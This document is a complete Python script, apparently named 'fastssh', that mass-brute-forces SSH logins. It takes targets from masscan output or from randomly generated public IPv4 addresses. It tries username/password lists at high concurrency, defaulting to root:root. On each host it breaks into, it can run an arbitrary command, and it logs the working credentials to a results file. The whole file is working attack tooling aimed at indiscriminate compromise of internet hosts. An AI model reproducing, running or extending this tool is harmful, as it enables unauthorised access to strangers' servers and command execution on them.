#!/usr/bin/env python3
"""
fastssh - async SSH discovery and credential testing orchestrator.

Key ideas:
- Prefer external high-speed scanners (masscan/zmap) and ingest their JSON.
- Use async TCP probes to skip dead hosts before brute attempts.
- Async SSH auth attempts with tight concurrency and stop-after-first options.
- Structured JSONL output for easy parsing/resume.
"""

import argparse
import asyncio
import ipaddress
import json
import os
import random
import contextlib
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Set, Tuple

try:
    import orjson  # type: ignore
except ImportError:
    orjson = None

import asyncssh


# -----------------------------------------------------------------------------
# Data classes and helpers
# -----------------------------------------------------------------------------


@dataclass
class Config:
    targets: Dict[str, Set[int]] = field(default_factory=dict)
    combos: List[Tuple[str, str]] = field(default_factory=list)
    connect_timeout: float = 3.0
    auth_timeout: float = 5.0
    read_timeout: float = 3.0
    max_workers: int = 200
    queue_size: int = 10000
    stop_first_host: bool = False
    stop_first_global: bool = False
    command: Optional[str] = None
    command_output: bool = True
    capture_banner: bool = False
    probe: bool = True
    shuffle: bool = True
    results_path: Path = Path("results.jsonl")
    log_interval: float = 5.0


@dataclass
class WorkItem:
    host: str
    port: int
    user: str
    password: str


@dataclass
class HostState:
    stop: asyncio.Event = field(default_factory=asyncio.Event)
    banner: Optional[str] = None


def load_lines(path: Path) -> List[str]:
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except OSError as exc:
        raise SystemExit(f"Failed to read {path}: {exc}") from exc


def parse_target(line: str, default_port: int = 22) -> Tuple[str, List[int]]:
    host = line.strip()
    if not host:
        return "", []
    if ":" in host:
        base, ports_raw = host.split(":", 1)
        ports = [int(p) for p in ports_raw.split(",") if p]
        ports = ports or [default_port]
        return base, ports
    return host, [default_port]


def collect_targets(args: argparse.Namespace) -> Dict[str, Set[int]]:
    targets: Dict[str, Set[int]] = {}

    def add_target(host: str, ports: Iterable[int]) -> None:
        if not host:
            return
        targets.setdefault(host, set()).update(ports)

    # Inline targets
    for t in args.target or []:
        host, ports = parse_target(t, args.port)
        add_target(host, ports)

    # File-based targets
    if args.targets:
        for line in load_lines(Path(args.targets)):
            host, ports = parse_target(line, args.port)
            add_target(host, ports)

    # masscan JSON ingestion
    if args.masscan_json:
        try:
            data = json.loads(Path(args.masscan_json).read_text())
        except (OSError, json.JSONDecodeError) as exc:
            raise SystemExit(f"Failed to load masscan JSON: {exc}") from exc
        if isinstance(data, dict):
            data = [data]
        for entry in data:
            ip = entry.get("ip")
            for port_info in entry.get("ports", []):
                if port_info.get("status") != "open":
                    continue
                add_target(ip, [int(port_info.get("port", args.port))])

    # Random public IPv4 generation
    for _ in range(args.random or 0):
        ip = ipaddress.ip_address(".".join(str(random.randint(0, 255)) for _ in range(4)))
        if ip.is_private or ip.is_loopback or ip.is_multicast:
            continue
        add_target(str(ip), [args.port])

    if not targets:
        raise SystemExit("No targets provided.")

    return targets


def load_creds(args: argparse.Namespace) -> List[Tuple[str, str]]:
    combos: Set[Tuple[str, str]] = set()

    # combo file: user:pass per line
    if args.combo_file:
        for line in load_lines(Path(args.combo_file)):
            if ":" not in line:
                continue
            user, pwd = line.split(":", 1)
            combos.add((user, pwd))

    users: List[str] = []
    passwords: List[str] = []

    if args.user_file:
        users.extend(load_lines(Path(args.user_file)))
    if args.users:
        users.extend(args.users)
    if not users:
        users = ["root"]

    if args.pass_file:
        passwords.extend(load_lines(Path(args.pass_file)))
    if args.passwords:
        passwords.extend(args.passwords)
    if not passwords and not combos:
        passwords = ["root"]

    if not combos:
        for u in users:
            for p in passwords:
                combos.add((u, p))

    return list(combos)


def dumps_json(record: dict) -> str:
    if orjson:
        return orjson.dumps(record).decode()
    return json.dumps(record, ensure_ascii=False)


# -----------------------------------------------------------------------------
# Networking helpers
# -----------------------------------------------------------------------------


async def probe_port(host: str, port: int, timeout: float) -> Optional[str]:
    """
    TCP probe to check reachability and optionally grab the SSH banner.
    """
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
        banner = None
        try:
            banner = await asyncio.wait_for(reader.read(128), timeout=timeout)
            banner = banner.decode(errors="ignore").strip()
        except Exception:
            banner = None
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
        return banner
    except Exception:
        return None


# -----------------------------------------------------------------------------
# Brute engine
# -----------------------------------------------------------------------------


async def attempt_login(
    item: WorkItem,
    cfg: Config,
    host_state: HostState,
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, int],
) -> None:
    if global_stop.is_set() or host_state.stop.is_set():
        return

    try:
        conn = await asyncssh.connect(
            item.host,
            port=item.port,
            username=item.user,
            password=item.password,
            known_hosts=None,
            client_keys=[],
            login_timeout=cfg.auth_timeout,
            connect_timeout=cfg.connect_timeout,
            compression_algs=["none"],
        )
    except (asyncssh.PermissionDenied, asyncssh.misc.DisconnectError, asyncio.TimeoutError):
        stats["failures"] += 1
        return
    except OSError:
        stats["failures"] += 1
        return

    async with conn:
        record = {
            "host": item.host,
            "port": item.port,
            "user": item.user,
            "password": item.password,
        }

        if cfg.command:
            try:
                result = await asyncio.wait_for(conn.run(cfg.command, check=False), timeout=cfg.read_timeout)
                if cfg.command_output:
                    record["command"] = cfg.command
                    record["stdout"] = result.stdout
                    record["stderr"] = result.stderr
            except Exception:
                record["command"] = cfg.command
                record["stdout"] = ""
                record["stderr"] = "<command error>"

        if host_state.banner:
            record["banner"] = host_state.banner

        async with file_lock:
            cfg.results_path.parent.mkdir(parents=True, exist_ok=True)
            with cfg.results_path.open("a", encoding="utf-8") as f:
                f.write(dumps_json(record) + "\n")

        stats["successes"] += 1

        if cfg.stop_first_host:
            host_state.stop.set()
        if cfg.stop_first_global:
            global_stop.set()


async def worker(
    queue: "asyncio.Queue[Optional[WorkItem]]",
    cfg: Config,
    host_states: Dict[str, HostState],
    global_stop: asyncio.Event,
    file_lock: asyncio.Lock,
    stats: Dict[str, int],
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            return

        if global_stop.is_set() or host_states[item.host].stop.is_set():
            queue.task_done()
            continue

        await attempt_login(item, cfg, host_states[item.host], global_stop, file_lock, stats)
        stats["attempts"] += 1
        queue.task_done()


# -----------------------------------------------------------------------------
# Orchestration
# -----------------------------------------------------------------------------


async def build_queue(
    cfg: Config, queue: "asyncio.Queue[Optional[WorkItem]]", host_states: Dict[str, HostState]
) -> None:
    items = []
    for host, ports in cfg.targets.items():
        host_states.setdefault(host, HostState())
        for port in ports:
            for user, pwd in cfg.combos:
                items.append(WorkItem(host, port, user, pwd))

    if cfg.shuffle:
        random.shuffle(items)

    for item in items:
        await queue.put(item)

    for _ in range(cfg.max_workers):
        await queue.put(None)


async def probe_targets(cfg: Config, host_states: Dict[str, HostState]) -> None:
    if not cfg.probe:
        return
    filtered: Dict[str, Set[int]] = {}
    tasks = []
    for host, ports in cfg.targets.items():
        for port in ports:
            tasks.append((host, port))

    sem = asyncio.Semaphore(cfg.max_workers)
    results: Dict[Tuple[str, int], Optional[str]] = {}

    async def one(host: str, port: int) -> None:
        async with sem:
            banner = await probe_port(host, port, cfg.connect_timeout)
            results[(host, port)] = banner

    await asyncio.gather(*(one(h, p) for h, p in tasks))

    for (host, port), banner in results.items():
        if banner is not None:
            filtered.setdefault(host, set()).add(port)
            if cfg.capture_banner:
                host_states.setdefault(host, HostState()).banner = banner

    cfg.targets = filtered
    if not cfg.targets:
        raise SystemExit("No live SSH targets after probing.")


async def progress_reporter(stats: Dict[str, int], interval: float, stop: asyncio.Event) -> None:
    while not stop.is_set():
        await asyncio.sleep(interval)
        attempts = stats.get("attempts", 0)
        successes = stats.get("successes", 0)
        failures = stats.get("failures", 0)
        print(f"[progress] attempts={attempts} successes={successes} failures={failures}")


async def run(cfg: Config) -> None:
    host_states: Dict[str, HostState] = {}
    await probe_targets(cfg, host_states)

    queue: "asyncio.Queue[Optional[WorkItem]]" = asyncio.Queue(maxsize=cfg.queue_size)
    global_stop = asyncio.Event()
    file_lock = asyncio.Lock()
    stats = {"attempts": 0, "successes": 0, "failures": 0}

    await build_queue(cfg, queue, host_states)

    workers = [
        asyncio.create_task(worker(queue, cfg, host_states, global_stop, file_lock, stats))
        for _ in range(cfg.max_workers)
    ]
    reporter_stop = asyncio.Event()
    reporter = asyncio.create_task(progress_reporter(stats, cfg.log_interval, reporter_stop))

    await queue.join()
    global_stop.set()
    reporter_stop.set()
    await reporter
    for w in workers:
        w.cancel()
    with contextlib.suppress(Exception):
        await asyncio.gather(*workers)


# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="fast SSH credential testing orchestrator")
    p.add_argument("--target", action="append", help="host or host:ports (comma-separated)")
    p.add_argument("--targets", help="file with host[:ports] per line")
    p.add_argument("--masscan-json", help="masscan JSON output to ingest")
    p.add_argument("--random", type=int, default=0, help="generate N random public IPv4s")
    p.add_argument("--port", type=int, default=22, help="default port when none given")

    p.add_argument("--users", nargs="+", help="usernames")
    p.add_argument("--user-file", help="file with usernames")
    p.add_argument("--passwords", nargs="+", help="passwords")
    p.add_argument("--pass-file", help="file with passwords")
    p.add_argument("--combo-file", help="file with user:pass per line")

    p.add_argument("--max-workers", type=int, default=200, help="parallel SSH attempts")
    p.add_argument("--queue-size", type=int, default=10000, help="max queued attempts")
    p.add_argument("--connect-timeout", type=float, default=3.0)
    p.add_argument("--auth-timeout", type=float, default=5.0)
    p.add_argument("--read-timeout", type=float, default=3.0)
    p.add_argument("--log-interval", type=float, default=5.0, help="seconds between progress prints")

    p.add_argument("--command", help="run this command on success")
    p.add_argument("--no-command-output", action="store_true", help="suppress command stdout/stderr in logs")
    p.add_argument("--stop-first-host", action="store_true", help="stop attacking a host after first success")
    p.add_argument("--stop-first-global", action="store_true", help="stop all work after first success")
    p.add_argument("--no-probe", action="store_true", help="skip TCP probe step")
    p.add_argument("--banner", action="store_true", help="capture SSH banner during probe")
    p.add_argument("--no-shuffle", action="store_true", help="disable randomization of attempts")
    p.add_argument("--results", default="results.jsonl", help="path to JSONL output")
    return p


def main(argv: Optional[Sequence[str]] = None) -> None:
    parser = build_parser()
    args = parser.parse_args(argv)

    cfg = Config(
        targets=collect_targets(args),
        combos=load_creds(args),
        connect_timeout=args.connect_timeout,
        auth_timeout=args.auth_timeout,
        read_timeout=args.read_timeout,
        max_workers=args.max_workers,
        queue_size=args.queue_size,
        stop_first_host=args.stop_first_host,
        stop_first_global=args.stop_first_global,
        command=args.command,
        command_output=not args.no_command_output,
        capture_banner=args.banner,
        probe=not args.no_probe,
        shuffle=not args.no_shuffle,
        results_path=Path(args.results),
        log_interval=args.log_interval,
    )

    try:
        asyncio.run(run(cfg))
    except KeyboardInterrupt:
        print("Interrupted, exiting.")


if __name__ == "__main__":
    main()
